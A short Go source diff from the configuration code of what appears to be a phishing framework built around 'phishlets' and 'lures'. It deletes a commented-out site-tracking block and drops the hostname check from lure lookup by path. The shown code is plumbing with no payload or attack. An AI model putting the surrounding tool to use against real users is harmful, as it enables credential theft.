@@ -649,7 +649,6 @@ func (c *Config) VerifyPhishlets() {
 }
 
 func (c *Config) CleanUp() {
-
 	for k := range c.phishletConfig {
 		_, err := c.GetPhishlet(k)
 		if err != nil {
@@ -657,26 +656,6 @@ func (c *Config) CleanUp() {
 		}
 	}
 	c.SavePhishlets()
-	/*
-		var sites_enabled []string
-		var sites_hidden []string
-		for k := range c.siteDomains {
-			_, err := c.GetPhishlet(k)
-			if err != nil {
-				delete(c.siteDomains, k)
-			} else {
-				if c.IsSiteEnabled(k) {
-					sites_enabled = append(sites_enabled, k)
-				}
-				if c.IsSiteHidden(k) {
-					sites_hidden = append(sites_hidden, k)
-				}
-			}
-		}
-		c.cfg.Set(CFG_SITE_DOMAINS, c.siteDomains)
-		c.cfg.Set(CFG_SITES_ENABLED, sites_enabled)
-		c.cfg.Set(CFG_SITES_HIDDEN, sites_hidden)
-		c.cfg.WriteConfig()*/
 }
 
 func (c *Config) AddLure(site string, l *Lure) {
@@ -738,16 +717,11 @@ func (c *Config) GetLure(index int) (*Lure, error) {
 	}
 }
 
-func (c *Config) GetLureByPath(site string, host string, path string) (*Lure, error) {
+func (c *Config) GetLureByPath(site string, path string) (*Lure, error) {
 	for _, l := range c.lures {
 		if l.Phishlet == site {
-			pl, err := c.GetPhishlet(site)
-			if err == nil {
-				if host == l.Hostname || host == pl.GetLandingPhishHost() {
-					if l.Path == path {
-						return l, nil
-					}
-				}
+			if l.Path == path {
+				return l, nil
 			}
 		}
 	}
